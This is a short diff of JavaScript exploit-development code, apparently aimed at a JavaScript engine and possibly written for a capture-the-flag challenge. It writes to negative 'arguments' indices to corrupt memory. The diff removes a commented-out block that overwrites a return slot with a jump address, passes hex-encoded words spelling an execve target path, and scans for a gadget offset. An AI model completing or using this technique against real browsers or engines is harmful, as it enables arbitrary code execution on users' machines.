@@ -40,26 +40,7 @@ if (1 > 0) {
             arguments[-6] = 0x0;
             arguments[-5] = 0x0;
         } 
-        //var x = 0xff || jump_location;
     }
     func3();
-    // Execve =
-    /*function func2(i,j,k,l,m){
-        arguments[-2] = jump_location;
-        return;
-    }
-    func2(0x2F757372,0x2F6C6F63,0x616C2F62,0x696E2F6C,0x33337400);
-    var jump_offset = 0x100;
-    var first_jump = jump_offset + current_base;
-    var save_i = 0;
-    for (var i = 0; i < 100000000; i += 1) {
-        if ((first_jump & 0xFFFFFF) == 0x5f0F34) {
-            alert(first_jump);
-            save_i = i;
-            i = 100000000;
-        } else{
-            first_jump += 0x2c;
-        }
-    }*/
 }
 
